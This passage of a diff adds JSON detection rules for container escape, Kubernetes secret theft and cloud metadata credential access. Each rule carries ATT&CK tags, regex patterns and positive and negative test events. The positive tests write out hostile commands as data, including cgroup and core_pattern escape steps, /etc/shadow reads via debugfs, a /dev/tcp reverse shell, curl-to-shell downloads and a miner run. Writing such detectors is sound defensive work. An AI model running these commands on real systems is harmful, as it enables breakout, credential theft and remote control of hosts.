+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo '/cmd' > /tmp/cgrp/release_agent"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sh -c mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp; echo 1 > /tmp/cgrp/x/notify_on_release"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/cat",
+      "command": "cat /sys/fs/cgroup/memory/memory.limit_in_bytes"
+     },
+     {
+      "executable": "/usr/bin/ls",
+      "command": "ls /sys/fs/cgroup"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-cgroup-release-agent-file",
+   "name": "release_agent file written",
+   "description": "File event on a cgroup release_agent or notify_on_release file.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "/(release_agent|notify_on_release)$"
+   },
+   "tags": [
+    "cgroup",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/sys/fs/cgroup/rdma/x/release_agent",
+      "operation": "modify"
+     },
+     {
+      "path": "/tmp/cgrp/release_agent",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/sys/fs/cgroup/memory/memory.stat",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-core-pattern-pipe",
+   "name": "Kernel core_pattern or modprobe helper rewritten",
+   "description": "Writing a piped handler into /proc/sys/kernel/core_pattern or /proc/sys/kernel/modprobe, a container-escape primitive.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(>|tee\\s+)\\s*/proc/sys/kernel/(core_pattern|modprobe)|sysctl\\s+(-w\\s+)?kernel\\.(core_pattern|modprobe)="
+   },
+   "tags": [
+    "proc",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo '|/tmp/x.sh %p' > /proc/sys/kernel/core_pattern"
+     },
+     {
+      "executable": "/sbin/sysctl",
+      "command": "sysctl -w kernel.modprobe=/tmp/m"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/cat",
+      "command": "cat /proc/sys/kernel/core_pattern"
+     },
+     {
+      "executable": "/sbin/sysctl",
+      "command": "sysctl kernel.core_pattern"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-host-helper-file-write",
+   "name": "Kernel helper path files modified",
+   "description": "File event on core_pattern, modprobe, uevent_helper or sysrq-trigger.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "^/(proc/sys/kernel/(core_pattern|modprobe)|sys/kernel/uevent_helper|proc/sysrq-trigger)$"
+   },
+   "tags": [
+    "proc",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/proc/sys/kernel/core_pattern",
+      "operation": "modify"
+     },
+     {
+      "path": "/sys/kernel/uevent_helper",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/proc/sys/kernel/hostname",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-debugfs-host-disk",
+   "name": "debugfs or raw mknod on a host block device",
+   "description": "debugfs -w on /dev/sdX, or mknod b to recreate a host disk node inside a container.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bdebugfs\\b.*(-w|-R).*(/dev/(sd|vd|nvme|xvd|dm-)\\S*)|\\bdebugfs\\s+/dev/(sd|vd|nvme|xvd)\\S*"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bmknod\\s+\\S+\\s+b\\s+\\d+\\s+\\d+"
+     }
+    ]
+   },
+   "tags": [
+    "block-device",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/sbin/debugfs",
+      "command": "debugfs -R cat /etc/shadow /dev/sda1"
+     },
+     {
+      "executable": "/bin/mknod",
+      "command": "mknod /dev/sdx b 8 1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/mknod",
+      "command": "mknod /tmp/fifo p"
+     },
+     {
+      "executable": "/usr/bin/ls",
+      "command": "ls /dev/sda"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-userns-unshare-root",
+   "name": "unshare mapping the caller to root with mount namespace",
+   "description": "unshare -r with -m, the first step of many user-namespace privilege-escalation exploits.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/unshare"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-\\w*r\\w*(\\s|$)|--map-root-user"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-\\w*[mu]\\w*(\\s|$)|--mount\\b|--user\\b"
+     }
+    ]
+   },
+   "tags": [
+    "unshare",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/unshare",
+      "command": "unshare -Urm /bin/bash"
+     },
+     {
+      "executable": "/usr/bin/unshare",
+      "command": "unshare --map-root-user --mount sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/unshare",
+      "command": "unshare -n ip link"
+     },
+     {
+      "executable": "/usr/bin/unshare",
+      "command": "unshare --fork --pid --mount-proc bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-container-recon-tools",
+   "name": "Container escape or breakout enumeration tool",
+   "description": "cdk, deepce, amicontained, botb or peirates invoked, tools built to enumerate and exploit container misconfiguration.",
+   "tactic": "Discovery",
+   "technique": "T1613",
+   "technique_name": "Container and Resource Discovery",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(cdk|deepce(\\.sh)?|amicontained|botb|peirates|kdigger|kubeletctl)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(deepce\\.sh|cdk\\s+(run|eva|evaluate)|amicontained|kdigger\\s+(run|gather)|peirates)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "container-tools",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/cdk",
+      "command": "cdk eva --full"
+     },
+     {
+      "executable": "/tmp/deepce.sh",
+      "command": "./deepce.sh -e SOCK"
+     },
+     {
+      "executable": "/usr/local/bin/amicontained",
+      "command": "amicontained"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/cdc",
+      "command": "cdc status"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker context ls"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-container-cap-recon",
+   "name": "Container capability and cgroup self-inspection",
+   "description": "Reading CapEff from /proc/self/status or /proc/1/cgroup then decoding with capsh, typical of breakout reconnaissance.",
+   "tactic": "Discovery",
+   "technique": "T1613",
+   "technique_name": "Container and Resource Discovery",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(grep\\s+(-\\w+\\s+)?Cap(Eff|Prm|Bnd)\\s+/proc/(self|1)/status|capsh\\s+--decode=|cat\\s+/proc/1/cgroup.*(docker|kubepods))"
+   },
+   "tags": [
+    "container-discovery",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c grep CapEff /proc/self/status"
+     },
+     {
+      "executable": "/sbin/capsh",
+      "command": "capsh --decode=0000003fffffffff"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/grep",
+      "command": "grep VmRSS /proc/self/status"
+     },
+     {
+      "executable": "/usr/bin/cat",
+      "command": "cat /proc/cpuinfo"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-k8s-sa-token-read",
+   "name": "Kubernetes service account token read from a shell",
+   "description": "cat/curl/base64 of /var/run/secrets/kubernetes.io/serviceaccount/token, used to call the API server from a compromised pod.",
+   "tactic": "Credential Access",
+   "technique": "T1552.007",
+   "technique_name": "Unsecured Credentials: Container API",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "/(var/)?run/secrets/kubernetes\\.io/serviceaccount/token"
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/secrets"
+     },
+     {
+      "executable": "/usr/bin/cat",
+      "command": "cat /run/secrets/kubernetes.io/serviceaccount/token"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/cat",
+      "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
+     },
+     {
+      "executable": "/usr/bin/cat",
+      "command": "cat /var/run/secrets/app/db-password"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-k8s-api-curl-bearer",
+   "name": "In-cluster API server call with a bearer token",
+   "description": "curl against kubernetes.default or the API server listing secrets, pods, or configmaps with an Authorization header.",
+   "tactic": "Credential Access",
+   "technique": "T1552.007",
+   "technique_name": "Unsecured Credentials: Container API",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(curl|wget)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(kubernetes\\.default(\\.svc)?|\\$KUBERNETES_SERVICE_HOST|10\\.\\d+\\.\\d+\\.1:(443|6443))"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/api/v1/(secrets|namespaces/\\S+/secrets|configmaps|pods)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "Authorization:\\s*Bearer"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -sk https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets -H Authorization: Bearer eyJhbGciOi"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s https://kubernetes.default.svc/healthz"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s https://api.example.com/api/v1/secrets -H Authorization: Bearer abc"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubectl-get-secrets-all",
+   "name": "kubectl dumping secrets across namespaces or in full",
+   "description": "kubectl get secrets with -A/--all-namespaces together with -o yaml/json, or exporting every secret.",
+   "tactic": "Credential Access",
+   "technique": "T1552.007",
+   "technique_name": "Unsecured Credentials: Container API",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kubectl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bget\\s+secrets?\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-A\\b|--all-namespaces)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-o\\s*(yaml|json|jsonpath|go-template)"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get secrets -A -o yaml"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get secret --all-namespaces -o json"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get secrets -n prod"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get secrets -A"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get pods -A -o wide"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubectl-secret-decode",
+   "name": "kubectl secret value decoded in a pipeline",
+   "description": "kubectl get secret ... -o jsonpath/go-template piped to base64 -d, extracting a credential in clear.",
+   "tactic": "Credential Access",
+   "technique": "T1552.007",
+   "technique_name": "Unsecured Credentials: Container API",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "kubectl\\b.*\\bget\\s+secrets?\\b.*-o\\s*(jsonpath|go-template)\\S*.*\\|\\s*base64\\s+(-d|--decode|-D)"
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c kubectl get secret db -o jsonpath='{.data.password}' | base64 -d"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get secret db -o name"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubectl-exec-shell-sensitive-ns",
+   "name": "kubectl exec into a control-plane or secrets-bearing pod",
+   "description": "kubectl exec with a shell into kube-system or cluster add-on pods such as etcd, apiserver, coredns or vault.",
+   "tactic": "Execution",
+   "technique": "T1609",
+   "technique_name": "Container Administration Command",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kubectl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bexec\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-n|--namespace)[= ]kube-system|\\b(etcd|kube-apiserver|vault|cert-manager)\\S*\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--\\s+(/bin/)?(ba)?sh\\b"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl exec -it -n kube-system etcd-master -- sh"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl exec vault-0 -it -- /bin/sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl exec -it api-7d9f -- /bin/sh"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl exec -n kube-system coredns-1 -- cat /etc/coredns/Corefile"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubectl-privileged-pod-run",
+   "name": "kubectl run or create of a privileged or host-mounted pod",
+   "description": "kubectl run --overrides with hostPID, privileged, or hostPath /, or --privileged.",
+   "tactic": "Execution",
+   "technique": "T1610",
+   "technique_name": "Deploy Container",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kubectl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(run|create|apply)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "hostPID|\\\"privileged\\\":\\s*true|privileged:\\s*true|hostNetwork|\\\"path\\\":\\s*\\\"/\\\"|--privileged"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl run x --image=alpine --overrides={\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"x\",\"securityContext\":{\"privileged\":true}}]}} -- sleep 1d"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl run nginx --image=nginx --port=80"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl apply -f deploy.yaml"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubectl-cluster-admin-binding",
+   "name": "Cluster-admin role binding created from the command line",
+   "description": "kubectl create clusterrolebinding granting cluster-admin to a user, group or service account.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1098",
+   "technique_name": "Account Manipulation",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kubectl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "create\\s+(cluster)?rolebinding"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--clusterrole[= ]cluster-admin"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl create clusterrolebinding viewers --clusterrole=view --group=devs"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get clusterrolebindings"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubectl-auth-can-i-list",
+   "name": "kubectl auth can-i --list permission probing",
+   "description": "Enumerating what the current identity may do, usual first step after stealing a token.",
+   "tactic": "Discovery",
+   "technique": "T1613",
+   "technique_name": "Container and Resource Discovery",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kubectl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "auth\\s+can-i\\s+(--list|-\\w*\\s*--list)"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl auth can-i --list --token eyJhbGci"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl auth can-i create pods"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get pods"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubectl-token-flag-remote",
+   "name": "kubectl using a raw token against an external API server",
+   "description": "kubectl --token with --server and TLS verification disabled, used with a stolen credential.",
+   "tactic": "Credential Access",
+   "technique": "T1550.001",
+   "technique_name": "Use Alternate Authentication Material: Application Access Token",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kubectl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--token[= ]\\S+"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--server[= ]\\S+"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--insecure-skip-tls-verify"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl --server=https://203.0.113.10:6443 --token=eyJhbG --insecure-skip-tls-verify get secrets -A"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl --server=https://k8s.internal:6443 --token=abc get pods"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get pods --insecure-skip-tls-verify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubelet-api-exec",
+   "name": "Kubelet API exec or run called directly",
+   "description": "curl against port 10250 /run, /exec or /pods, direct kubelet access bypassing the API server audit.",
+   "tactic": "Execution",
+   "technique": "T1609",
+   "technique_name": "Container Administration Command",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\b(curl|wget)\\b.*:10250/(run|exec|pods|runningpods|containerLogs)"
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -sk https://10.0.0.7:10250/run/default/web/web -d cmd=id"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -k https://node1:10250/pods"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s http://localhost:10248/healthz"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -k https://node1:10250/healthz"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-etcd-secrets-read",
+   "name": "etcdctl reading the Kubernetes secrets prefix",
+   "description": "etcdctl get /registry/secrets, which returns every secret unencrypted at rest.",
+   "tactic": "Credential Access",
+   "technique": "T1552.007",
+   "technique_name": "Unsecured Credentials: Container API",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\betcdctl\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bget\\b.*/registry/(secrets|serviceaccounts)"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/etcdctl",
+      "command": "etcdctl get /registry/secrets --prefix --keys-only"
+     },
+     {
+      "executable": "/usr/local/bin/etcdctl",
+      "command": "etcdctl --cacert ca.crt get /registry/secrets/kube-system/x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/etcdctl",
+      "command": "etcdctl endpoint health"
+     },
+     {
+      "executable": "/usr/local/bin/etcdctl",
+      "command": "etcdctl get /registry/pods --prefix --keys-only"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-kubectl-cronjob-create",
+   "name": "CronJob created from the command line",
+   "description": "kubectl create cronjob, a Kubernetes persistence mechanism that reschedules a container.",
+   "tactic": "Persistence",
+   "technique": "T1053.007",
+   "technique_name": "Scheduled Task/Job: Container Orchestration Job",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kubectl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "create\\s+cronjob"
+     }
+    ]
+   },
+   "tags": [
+    "kubernetes",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl create cronjob upd --image=alpine --schedule=*/5 * * * * -- sh -c curl http://203.0.113.4|sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get cronjobs"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl create job once --image=alpine"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-remote-daemon-tcp",
+   "name": "Docker client pointed at a remote TCP daemon",
+   "description": "docker -H tcp://host:2375, sending container commands to an unauthenticated remote daemon.",
+   "tactic": "Execution",
+   "technique": "T1610",
+   "technique_name": "Deploy Container",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/podman-remote"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-H|--host)[= ]tcp://(?:[^\\s]+):237[56]"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "tcp://(127\\.0\\.0\\.1|localhost|\\[::1\\])"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "docker",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker -H tcp://203.0.113.20:2375 run -d alpine sh"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker --host tcp://198.51.100.8:2375 ps"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker -H tcp://127.0.0.1:2375 ps"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker -H unix:///var/run/docker.sock ps"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-pull-miner-image",
+   "name": "Container image for a cryptocurrency miner pulled or run",
+   "description": "docker pull/run of images named xmrig, monero, kinsing, or coinminer.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/podman",
+       "/nerdctl",
+       "/crictl"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(pull|run)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(xmrig|monero|kinsing|coinminer|cryptonight|minerd|miner:latest)"
+     }
+    ]
+   },
+   "tags": [
+    "miner",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -d --restart always xmrig/xmrig -o pool.minexmr.com:4444"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker pull kinsing/kdevtmpfsi"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker pull postgres:16"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --rm busybox echo mining"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-exec-root-reverse",
+   "name": "Reverse shell or download pipeline run via docker exec",
+   "description": "docker/kubectl exec whose command is a /dev/tcp reverse shell or curl-to-shell pipeline.",
+   "tactic": "Execution",
+   "technique": "T1609",
+   "technique_name": "Container Administration Command",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/kubectl",
+       "/crictl",
+       "/nerdctl"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bexec\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/dev/tcp/|(curl|wget)\\b[^|]*\\|\\s*(ba)?sh\\b|nc\\s+(-\\w+\\s+)*\\d+\\.\\d+\\.\\d+\\.\\d+\\s+\\d+"
+     }
+    ]
+   },
+   "tags": [
+    "container-exec",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker exec web sh -c curl -s http://203.0.113.4/x | sh"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl exec api -- bash -c bash -i >& /dev/tcp/203.0.113.4/4444 0>&1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker exec web curl -s localhost:8080/healthz"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl exec api -- cat /etc/hosts"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-imds-credential-path-curl",
+   "name": "Instance metadata credentials requested with curl or wget",
+   "description": "A request for the IAM role credential, identity token, or service-account token paths of AWS, GCP or Azure metadata endpoints.",
+   "tactic": "Credential Access",
+   "technique": "T1552.005",
+   "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(curl|wget|http|python\\S*|nc)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(169\\.254\\.169\\.254|metadata\\.google\\.internal|169\\.254\\.170\\.2|100\\.100\\.100\\.200|fd00:ec2::254)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(iam/security-credentials|computeMetadata/v1/instance/service-accounts/\\S*/token|metadata/identity/oauth2/token|api/token|AWS_CONTAINER_CREDENTIALS_RELATIVE_URI|v2/credentials|ram/security-credentials)"
+     }
+    ]
+   },
+   "tags": [
+    "imds",
+    "cloud",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"
+     },
+     {
+      "executable": "/usr/bin/curl",
